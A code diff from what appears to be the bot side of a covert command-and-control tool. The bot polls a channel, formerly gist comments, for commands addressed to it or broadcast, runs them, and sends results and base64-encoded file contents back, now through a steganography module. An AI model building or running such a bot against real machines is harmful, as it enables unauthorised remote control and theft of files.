@@ -5,6 +5,7 @@ import time
 import utils
 from utils import Command
 import log
+import stegano
 
 SHOW_INFO = True
 LOGFILE = '.botlog'
@@ -39,28 +40,18 @@ def handle_command(cmd, data, r):
 
 
 def respond(cmd, out, r):
-    comment = construct_response(BOT_ID, cmd, out, r)
-    return utils.post_gist_comment(comment)
-
-
-# TODO rework
-def construct_response(bot, cmd, out, r):
-    return utils.DELIM \
-        + str(int(False)) + utils.DELIM \
-        + str(bot) + utils.DELIM \
-        + cmd.name + utils.DELIM \
-        + out + utils.DELIM \
-        + str(int(r)) + utils.DELIM
+    msg = utils.construct_message(False, BOT_ID, cmd, out, r)
+    return utils.send_message(msg)
 
 
 def check_for_commands():
     global LAST_COMMENT
-    data, LAST_COMMENT = utils.get_fresh_comments(LAST_COMMENT)
-    log.add_log_entry(SHOW_INFO, LOGFILE, log.CheckForCommands(len(data)))
+    messages, LAST_COMMENT = utils.get_fresh_messages(LAST_COMMENT)
+    log.add_log_entry(SHOW_INFO, LOGFILE, log.CheckForCommands(len(messages)))
     
     handled = 0
-    for comment in data:
-        isctrl, bot, cmd, d, r = utils.parse_msg(comment['body'])
+    for msg in messages:
+        isctrl, bot, cmd, d, r = utils.parse_message(msg)
         if isctrl and (bot == utils.BROADCAST or bot == BOT_ID):
             handle_command(cmd, d, r)
             handled += 1
@@ -72,7 +63,7 @@ def read_file(filepath):
     filedata = file.read()
     file.close()
 
-    data = utils.text_to_base64(filedata)
+    data = stegano.text_to_base64(filedata)
     return filepath + '\n' + data
 
 
